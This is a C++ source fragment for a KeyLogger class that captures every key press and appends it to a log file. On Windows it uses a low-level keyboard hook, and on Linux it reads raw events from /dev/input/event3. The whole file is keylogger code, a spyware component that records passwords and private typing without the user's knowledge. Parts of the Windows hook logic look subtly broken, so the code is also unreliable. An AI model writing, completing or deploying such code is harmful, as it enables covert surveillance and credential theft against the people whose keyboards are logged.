#ifdef _WIN32
    #include <windows.h>
#else
    #include <linux/input.h>
    #include <fcntl.h>
    #include <unistd.h>
#endif

KeyLogger::KeyLogger(const std::string& path) : logPath_(path) {}

void KeyLogger::start() {
    running_ = true;
    worker_ = std::thread(&KeyLogger::run, this);
}

void KeyLogger::stop() {
    running_ = false;
    if (worker_.joinable()) worker_.join();
}

void KeyLogger::run() {
    logFile_.open(logPath_, std::ios::app);
#ifdef _WIN32
    // low-level keyboard hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL,
        [](int nCode, WPARAM wParam, LPARAM lParam)->LRESULT {
            if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
                auto* p = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
                char key = MapVirtualKey(p->vkCode, MAPVK_VK_TO_CHAR);
                KeyLogger* self = reinterpret_cast<KeyLogger*>(GetWindowLongPtr(nullptr, GWLP_USERDATA));
                self->logFile_ << key;
            }
            return CallNextHookEx(nullptr, nCode, wParam, lParam);
        }, nullptr, 0);
    SetWindowLongPtr(nullptr, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(this));
    MSG msg;
    while (running_ && GetMessage(&msg, nullptr, 0, 0)) {}
    UnhookWindowsHookEx(hook);
#else
    // Linux: read from /dev/input/event*
    int fd = open("/dev/input/event3", O_RDONLY);   // pick the correct event device
    struct input_event ev;
    while (running_ && read(fd, &ev, sizeof(ev)) > 0) {
        if (ev.type == EV_KEY && ev.value == 1) {     // key press
            logFile_ << ev.code << ' ';
        }
    }
    close(fd);
#endif
    logFile_.close();
}
